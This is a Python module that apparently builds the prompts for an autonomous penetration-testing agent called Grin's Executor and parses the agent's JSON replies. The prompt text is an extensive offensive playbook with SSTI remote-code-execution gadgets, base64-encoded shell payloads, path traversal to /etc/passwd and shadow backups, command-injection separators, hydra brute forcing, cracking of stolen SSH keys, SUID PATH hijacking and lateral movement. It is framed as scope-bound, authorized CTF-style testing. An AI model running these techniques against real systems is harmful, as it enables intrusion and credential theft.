"""Prompt construction + tolerant reply parsing for the Executor loop. Free-text prompts
(no JSON mode) + JSON-then-Markdown parsing, per Sensei's experience with local GGUF models."""
import re
from dataclasses import dataclass

from grin.finding import Finding, normalize_severity
from grin.jsonextract import extract_json
from grin.secret import Secret

SYSTEM = (
    "You are Grin's Executor, an autonomous penetration-testing agent operating under an "
    "explicit, human-authorized, scope-bound engagement. You accomplish ONE objective by "
    "driving Kali/BlackArch tools. Every action you propose is checked by a scope/ROE "
    "gatekeeper before it runs; out-of-scope or disallowed actions are refused and you must "
    "adapt. Be EFFICIENT: a strong operator reaches the goal in the FEWEST actions by reading "
    "each result and following the lead it reveals — not by guessing many things. Propose the "
    "SINGLE next action, or finish with findings. Reply with ONE JSON object and nothing else."
)


def _recent_failure(journal):
    """Look at the most recent EXECUTED step: return (command, empty?, exit_code) if it produced no
    output or a non-zero exit — the signal that the command was malformed and needs correcting, not
    abandoning. Returns None if the last executed step looked fine (or there isn't one)."""
    for s in reversed(getattr(journal, "steps", []) or []):
        if getattr(s, "decision", "") != "executed":
            continue
        out = (getattr(s, "output", "") or "").strip()
        code = getattr(s, "exit_code", 0)
        if not out or code not in (0, None):
            cmd = s.action.get("command", "") if isinstance(s.action, dict) else ""
            return cmd, (not out), code
        return None
    return None


def _self_correct_banner(journal) -> str:
    """A deterministic, code-injected self-correction nudge. The #1 cause of stalled engagements is
    the agent treating a FAILED command (empty/error output) as 'nothing here' and moving on. This
    forces it to diagnose+retry a corrected variant — generalising across whole classes of tool
    gotchas rather than needing a per-failure prompt patch."""
    rf = _recent_failure(journal)
    if rf is None:
        return ""
    cmd, empty, code = rf
    why = "returned NO output" if empty else f"exited with code {code}"
    return (
        "## STOP — your last command did not succeed (fix it before anything else)\n"
        f"`{cmd[:160]}` {why}. Empty/error output almost always means the command was MALFORMED — "
        "NOT that there is nothing to find. Do NOT move on, give up, or repeat it verbatim. Diagnose "
        "the cause and reissue a CORRECTED variant as your next action:\n"
        "- Empty output from a URL containing `{ }` or `[ ]` (e.g. an SSTI `{{7*7}}` payload): curl "
        "GLOBBED it. Re-send with `curl -g 'http://...'` or URL-encode the braces (`%7B%7B7*7%7D%7D`).\n"
        "- `permission denied` / `404` / `No such file`: wrong path or no rights — ENUMERATE (list the "
        "parent dir, or read a backup/alternate location) instead of retrying the same target.\n"
        "- Quoting/heredoc/escaping errors: simplify quoting; write data to a file with one redirect "
        "(`printf '%s' ... > /tmp/x`) and operate on the file.\n"
        "- A tool 'not found': install it (`grin arsenal add <tool>`) or use an installed equivalent.\n\n"
    )


def build_step_prompt(objective: str, target: str, journal, allowed_classes) -> tuple[str, str]:
    history = journal.render_history()
    user = (
        f"Objective: {objective}\n"
        f"Authorized target: {target}\n"
        f"Permitted action classes (ROE): {', '.join(allowed_classes)}\n\n"
        f"History so far:\n{history}\n\n"
        + _self_correct_banner(journal)
        + "## Read the result, then chase the lead (most important rule)\n"
        "Before deciding, READ the most recent result above. If it reveals anything specific — an "
        "HTML comment (`<!-- ... -->`), a link or referenced path, an endpoint, a parameter name, a "
        "version string, a username, or a credential — your VERY NEXT action MUST act on that exact "
        "lead. Do NOT guess random paths/inputs when the output already points somewhere, and do NOT "
        "ignore a hint you were just shown. Following what the tool already revealed is the fastest "
        "route to the goal.\n"
        "For web targets: fetch the page, then READ the response body for comments, links, and "
        "referenced paths, and request THOSE paths directly — don't blindly guess common paths first.\n\n"
        "## Web application methodology (don't stop at the landing page)\n"
        "A plain-looking page is rarely the whole app. Actively probe it:\n"
        "- Discover hidden content with `gobuster dir -u http://<target> -w "
        "/usr/share/wordlists/dirb/common.txt` (or ffuf) and `curl http://<target>/robots.txt`.\n"
        "- FUZZ PARAMETERS — many vulns live on a parameter that is NOT linked anywhere, so reading "
        "the page for links/comments will NEVER reveal them. Grepping the HTML is NOT testing: you must "
        "actively SEND requests with payloads to candidate parameters. Try these names on every "
        "endpoint: `file path page name id q search cmd host url user` — and crucially, if the page "
        "GREETS you with a value (e.g. `Hello, guest`), a parameter almost certainly controls it: "
        "immediately send `curl 'http://<target>/?name={{7*7}}'` (and `?name=test`) and check whether "
        "the value changes. Do this BEFORE giving up on a 'plain' page.\n"
        "- For each parameter, test the injection classes IN ORDER and read the response:\n"
        "    * SSTI: `?name={{7*7}}` — if the reply shows `49`, it's template injection -> RCE "
        "(escalate with `{{cycler.__init__.__globals__.os.popen('id').read()}}`).\n"
        "    * Path traversal / LFI: `?file=../../../../etc/passwd` — reads arbitrary files.\n"
        "    * OS command injection: `?host=127.0.0.1;id` / `| id` / `$(id)`.\n"
        "    * SQLi: `sqlmap -u 'http://<target>/?id=1' --batch`.\n\n"
        "## Running MULTI-STEP commands through a web RCE (SSTI / cmd-injection in a URL param)\n"
        "A URL query param mangles payloads: SPACES break it (use `${IFS}` instead of a space, or "
        "`%20`), and in base64 the chars `+` `/` `=` get corrupted (`+` decodes to a SPACE). So to run "
        "a multi-command exploit, base64-encode the WHOLE script, PERCENT-ENCODE the base64 "
        "(`+`->%2B, `/`->%2F, `=`->%3D), keep every space as `${IFS}` and every pipe as `%7C`, then "
        "pipe to sh:\n"
        "  cmd = `echo${IFS}<PCT_B64>%7Cbase64${IFS}-d%7Csh`\n"
        "  SSTI form: `?name={{cycler.__init__.__globals__.os.popen(\"echo${IFS}<PCT_B64>%7Cbase64${IFS}-d%7Csh\").read()}}`\n"
        "Inside the base64'd script use ABSOLUTE paths (`/bin/cat`, not `cat`). This single trick lands "
        "file writes, chmod, PATH changes, and privesc chains that one-line payloads cannot.\n"
        "PREFER the `web-rce` helper, which does ALL of this encoding for you — pass it a plain shell "
        "script and it runs it through the foothold and returns the output:\n"
        "  `web-rce --url http://<target>/ --param name --mode ssti --cmd '<your shell script>'`\n"
        "  `web-rce --url http://<target>/ping --param host --method POST --mode cmdi --cmd 'id'`\n"
        "  (`--mode auto` tries SSTI gadgets then injection separators automatically.)\n"
        "Use it to run a whole privesc chain in ONE action, e.g. the SUID PATH-hijack below:\n"
        "  `web-rce --url http://<t>/ --param name --mode ssti --cmd 'echo /bin/cat /root/flag.txt > "
        "/tmp/uptime; chmod 755 /tmp/uptime; PATH=/tmp:/usr/bin:/bin /usr/local/bin/syscheck'`\n\n"
        "## Enumerate before you guess (most-missed step)\n"
        "Your enumeration method depends on the primitive you have:\n"
        "- With CODE EXECUTION (a shell / cmd-injection): `ls -la` EACH interesting directory, not just "
        "`/`. Listing `/` and then guessing `cat /opt/flag.txt` is the classic miss — when `ls /` shows "
        "`opt`, your NEXT step is `ls -la /opt` (which would reveal e.g. `/opt/deploy/`), then read what "
        "you find. Recurse into the interesting ones: `/opt` and its subdirs, each `/home/<user>` (incl. "
        "`.ssh/`), `/srv`, `/var/backups`, `/etc`, the app dir. Never `cat` a guessed filename when you "
        "could `ls` its parent first.\n"
        "- With FILE-READ ONLY (traversal/LFI cannot list directories): you must READ known sensitive "
        "files BY FULL PATH. Beyond SSH keys, ALWAYS try the password-hash backups — `/etc/shadow` is "
        "usually unreadable to a low-priv web user, so read its BACKUPS: `/var/backups/shadow.bak`, "
        "`/var/backups/passwd.bak`, `/var/backups/shadow`. Also `/etc/passwd` (find the real username), "
        "each user's `~/.ssh/id_rsa`, and app configs (`.env`, `config.*`).\n"
        "Either way, hunt for: SSH keys (`id_rsa`, `*.pem`, `authorized_keys`), password hashes "
        "(`/etc/shadow`, `/var/backups/*.bak`, `.htpasswd`), configs/secrets, and notes/READMEs naming "
        "other hosts or accounts. A denied/empty flag read is a signal to ENUMERATE for a credential to "
        "crack, not to keep guessing flag paths.\n\n"
        "## Phase progression\n"
        "Work through these phases in order:\n"
        "  1. Recon — discover open ports and running services (one scan is enough).\n"
        "  2. Identify the specific weakness — version-based vuln, weak credentials, injectable param, etc.\n"
        "  3. Exploit it — use the appropriate tool to gain access or extract the proof.\n"
        "  4. Escalate — if you have a foothold but the proof (e.g. a root-owned file) is not readable "
        "as the current user, ENUMERATE privilege escalation; do not just retry the same read.\n"
        "  5. Capture proof — read the flag file, dump credentials, or confirm the shell.\n"
        "The objective is NOT complete until exploitation has been attempted and the requested proof captured.\n\n"
        "## Anti-repeat rule\n"
        "Do NOT repeat any command already shown in History. "
        "Once a port or service is identified, move on to exploiting it — do not re-scan.\n\n"
        "## Exploit-tool reference (use what fits the situation)\n"
        "- Weak SSH credentials: curated credential lists are present on the runner at "
        "`/usr/share/wordlists/users.txt` (usernames) and `/usr/share/wordlists/passwords.txt` "
        "(passwords). Use them with `hydra -L /usr/share/wordlists/users.txt "
        "-P /usr/share/wordlists/passwords.txt ssh://<target>` (small + fast). Do NOT use rockyou as "
        "a USERNAME list (-L). When hydra prints a line like `login: admin password: hunter2`, "
        "take the ACTUAL username and password it found (NOT the literal letters from this example) "
        "and log in: `sshpass -p <the-found-password> ssh <the-found-username>@<target> "
        "'cat ~/flag.txt'`, then record the real `username:password` you obtained in `secrets`.\n"
        "  The full rockyou list (~14M passwords) is at `/usr/share/wordlists/rockyou.txt`. Prefer the "
        "small curated list FIRST for online brute (fast). Only escalate to rockyou ONLINE in a capped "
        "form (e.g. `head -2000 /usr/share/wordlists/rockyou.txt > /tmp/p && hydra -P /tmp/p ...`) — a "
        "full 14M-password ONLINE SSH/web brute is far too slow to finish. rockyou's real strength is "
        "OFFLINE cracking (see below).\n"
        "- Offline password cracking: this is a PRIMARY tactic, not a last resort — actively hunt for "
        "crackable material (a hash in /etc/shadow, /var/backups/*.bak, a config; a password-protected "
        "ZIP/PDF/KeePass). When you find ANY hash, crack it OFFLINE with the full rockyou list — "
        "`john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>` then `john --show <hashfile>` "
        "(or `hashcat -m <mode> <hashes> /usr/share/wordlists/rockyou.txt`) — then use the recovered "
        "password to log in. This is where the 14M list pays off (millions of guesses/sec locally, no "
        "network/lockout limits), unlike online brute.\n"
        "- Captured loot is auto-saved on YOUR runner: any private key you exfiltrate is written to "
        "`/tmp/loot/id_rsa` (chmod 600) and any password hash to `/tmp/loot/hashes.txt`. Crack and "
        "ssh against THOSE files directly — do NOT guess a key path on the target (e.g. "
        "`/root/.ssh/id_rsa`); the key lives in /tmp/loot on the box you're running from.\n"
        "- Passphrase-protected SSH key: if a private key (`id_rsa`) asks for a passphrase, CRACK IT "
        "OFFLINE: `ssh2john /tmp/loot/id_rsa > key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt "
        "key.hash && john --show key.hash`, then decrypt with the passphrase "
        "(`ssh-keygen -p -P <passphrase> -N '' -f id_rsa`) and use `ssh -i id_rsa <user>@<host>`. A "
        "locked key is not a dead end.\n"
        "- Lateral movement / pivot: if the flag/proof is NOT on this host (or the goal says it lives "
        "elsewhere), use creds/keys you found here to reach OTHER in-scope hosts. Steps, in order: "
        "(1) SAVE a stolen key to a file and lock it down — `printf '%s' '<key>' > /tmp/k && "
        "chmod 600 /tmp/k` (do NOT pipe a key via `-i /dev/stdin`; ssh needs a real file). "
        "(2) If the key is passphrase-protected, CRACK it first (ssh2john + rockyou, above). "
        "(3) SCAN the rest of the authorized scope to find the OTHER host — `nmap -sn <range>` then "
        "`nmap -sV <host>` — and ssh to THAT discovered host, NOT back to the entry host you already "
        "own: `ssh -i /tmp/k <user>@<discovered-host> 'cat ~/flag.txt'` (the key/README names the "
        "account). The flag is one hop away.\n"
        "- USERNAME for a stolen key: do NOT default to `root`. The moment you exfiltrate a key, ALSO "
        "read any adjacent README/clue/comment (e.g. `cat /opt/*/README`) — it names the SERVICE "
        "ACCOUNT the key belongs to (e.g. 'deploy key for the analyst service account' -> user "
        "`analyst`). SSH as THAT user, and if it fails try the usernames from the key's path/owner.\n"
        "- Web command injection: test parameters with `curl` and chain shell metacharacters. CYCLE "
        "the separators — one is often filtered while another works: `;id`, `|id`, `&&id`, `$(id)`, "
        "`%0aid` (newline). If a payload returns only the NORMAL command output (e.g. the ping result) "
        "with no `uid=`, that separator is filtered — switch to the next one before moving on. Once "
        "`|id` (or whichever) shows `uid=`, reuse THAT separator for every follow-up command.\n"
        "- Once you have a shell or file-read primitive, READ THE FLAG WHERE IT ACTUALLY LIVES. The "
        "flag belongs to the user you are running as: try `cat ~/flag.txt` FIRST, then "
        "`cat /home/<user>/flag.txt`, `/root/flag.txt`, `/flag.txt`, `/flag`. Do this immediately "
        "after a foothold or an SSH pivot — when you `ssh user@host`, the flag is almost always that "
        "user's `~/flag.txt`. Prefer these exact paths over a broad `find / -name 'flag*'`, which "
        "drowns in `/sys/.../flags` noise and wastes the budget.\n"
        "- Privilege escalation (use when you have code execution as a low-priv user but the proof is "
        "a protected/root-owned file you cannot read): a 'Permission denied' on the flag means ESCALATE, "
        "not retry. First enumerate: `sudo -l` (sudo rights), `find / -perm -4000 -type f 2>/dev/null` "
        "(SUID binaries), `id`. If `sudo -l` shows a NOPASSWD binary, abuse it via GTFOBins — e.g. find: "
        "`sudo find <flagfile> -exec cat {} \\;` (or `sudo find . -exec cat /root/flag.txt \\; -quit`); "
        "vim/less/awk/python similarly spawn a root read/shell. Run the privesc command through your "
        "existing primitive (e.g. the same injection parameter).\n"
        "  PATH HIJACK of a SUID binary: if a SUID-root binary calls another program by BARE NAME "
        "(check `strings <suidbin>` for a relative call like `system(\"uptime\")`), plant your own that "
        "command in /tmp doing the root read by ABSOLUTE path, make it executable, and run the SUID "
        "with /tmp first on PATH:\n"
        "  `echo${IFS}/bin/cat${IFS}/root/flag.txt>/tmp/uptime; chmod${IFS}755${IFS}/tmp/uptime; "
        "PATH=/tmp:/usr/bin:/bin${IFS}<suidbin>` — the SUID runs your `uptime` as root and prints the "
        "flag. Deliver this as a base64 payload per the web-RCE rule above when your primitive is a URL.\n"
        "- FTP anonymous login: `ftp <target>` with user `anonymous`\n"
        "- SMB shares: `smbclient -L //<target> -N` then `smbclient //<target>/<share> -N`\n\n"
        "Decide the SINGLE next action, or finish if the objective is met.\n\n"
        "## Target field rule\n"
        "The `target` field must be a HOST or IP from the authorized scope — NEVER a file path or directory.\n\n"
        "## Credential-capture rule\n"
        "The moment you obtain credentials (e.g. hydra reports a valid login, or you confirm a password), "
        "IMMEDIATELY use them to log in (e.g. `sshpass -p <pw> ssh <user>@<target> 'cat <flagfile>'`) "
        "and capture the proof. ALWAYS record any credentials you obtain in the `secrets` array "
        "(with the full value) before finishing — a captured credential that is not recorded is lost.\n\n"
        "To act, reply EXACTLY:\n"
        '{"action": {"tool": "<tool>", "command": "<your command>", '
        f'"target": "{target}", "declared_class": "<permitted-class>", '
        '"why": "short reason"}}\n\n'
        "To finish, reply EXACTLY:\n"
        '{"done": true, "findings": [{"title": "...", '
        '"severity": "info|low|medium|high|critical", "evidence": "...", "tool": "...", '
        '"command": "...", "recommendation": "..."}], '
        '"secrets": [{"label": "...", "value": "...", "target": "...", "tool": "...", '
        '"command": "...", "context": "..."}]} '
        "(include any credentials/keys/tokens you actually obtained in `secrets`, with full values; "
        "omit the secrets array or leave it empty if none were captured)\n\n"
        "Return ONLY the JSON object."
    )
    return SYSTEM, user


@dataclass
class StepDecision:
    kind: str
    action: dict | None = None
    findings: list | None = None
    secrets: list | None = None


def _extract_json(raw: str):
    # robust: first balanced JSON object bearing an executor key (handles a valid action followed
    # by trailing prose or an echoed done-template). See grin/jsonextract.py.
    return extract_json(raw, want=("action", "done", "findings"))


def _parse_secrets(items, default_target) -> list:
    out = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        label = str(it.get("label", "")).strip()
        value = str(it.get("value", "")).strip()
        if not (label and value):
            continue
        out.append(Secret(
            label=label, value=value,
            target=str(it.get("target") or default_target).strip(),
            tool=str(it.get("tool", "")).strip(),
            command=str(it.get("command", "")).strip(),
            context=str(it.get("context", "")).strip(),
        ))
    return out


def _parse_findings(items, default_target) -> list:
    out = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        title = str(it.get("title", "")).strip()
        if not title:
            continue
        out.append(Finding(
            title=title,
            target=str(it.get("target") or default_target).strip(),
            severity=normalize_severity(it.get("severity")),
            evidence=str(it.get("evidence", "")).strip(),
            tool=str(it.get("tool", "")).strip(),
            command=str(it.get("command", "")).strip(),
            recommendation=str(it.get("recommendation", "")).strip(),
        ))
    return out


_CMD_RE = re.compile(r"(?im)^\s*[#>*\-\s]*\**\s*command\s*\**\s*:\s*(.+)$")


def _maybe_prepend_tool(tool: str, command: str) -> str:
    """If command's first token starts with '-' (binary was dropped), prepend the tool name."""
    if tool and command:
        first_token = command.split()[0] if command.split() else ""
        if first_token.startswith("-"):
            return f"{tool} {command}"
    return command


def parse_step(raw: str, default_target: str) -> StepDecision:
    data = _extract_json(raw)
    if isinstance(data, dict):
        act = data.get("action")
        if isinstance(act, dict) and str(act.get("tool", "")).strip() \
                and str(act.get("command", "")).strip():
            dc = act.get("declared_class")
            tool = str(act["tool"]).strip()
            command = _maybe_prepend_tool(tool, str(act["command"]).strip())
            return StepDecision("action", action={
                "tool": tool,
                "command": command,
                "target": str(act.get("target") or default_target).strip(),
                "declared_class": str(dc).strip() if dc else None,
                "why": str(act.get("why", "")).strip(),
            })
        if data.get("done") or "findings" in data:
            return StepDecision("done",
                                findings=_parse_findings(data.get("findings", []), default_target),
                                secrets=_parse_secrets(data.get("secrets", []), default_target))
    # Markdown fallback: a "Command:" line -> an action (tool = first token).
    m = _CMD_RE.search(raw or "")
    if m:
        command = m.group(1).strip().strip("`").strip()
        if command:
            return StepDecision("action", action={
                "tool": command.split()[0], "command": command,
                "target": default_target, "declared_class": None, "why": "",
            })
    return StepDecision("parse_miss")
